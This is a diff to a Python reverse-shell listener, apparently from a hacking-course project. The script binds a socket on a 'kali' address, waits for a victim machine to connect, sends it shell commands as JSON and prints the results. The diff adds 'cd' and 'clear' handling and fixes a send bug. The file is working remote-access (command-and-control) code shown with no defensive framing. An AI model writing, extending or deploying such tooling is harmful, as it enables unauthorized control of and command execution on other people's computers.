@@ -1,8 +1,10 @@
 import socket
 import json
+import os
 
-target_ip = "192.168.0.8"
-target_port = 4444
+# bind connection opening port and listening to connections
+kali_ip = '192.168.0.8'
+kali_port = 5555
 
 def target_communic(): 
     while True:
@@ -13,6 +15,10 @@ def target_communic():
         # quit program
         if command == 'quit': 
             break
+        elif command[:3] == 'cd ':
+            pass 
+        elif command == 'clear':
+            os.system('clear')
         else:
             # receives the response from the target when running our command
             result = reliable_receiv()
@@ -22,7 +28,7 @@ def reliable_send(data):
     # data is our command and parses it to json
     jsonData = json.dumps(data)
     # send actual data, once sending data over sockets we need to encode it
-    target.send(json.encode())
+    target.send(jsonData.encode())
 
 def reliable_receiv():
     data = ''
@@ -39,7 +45,7 @@ def reliable_receiv():
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # bind ip address and port
-sock.bind((target_ip, target_port))
+sock.bind((kali_ip, kali_port))
 
 # start listeing for incoming connections
 print('[+++++] Listening for the incoming connections [+++++]')
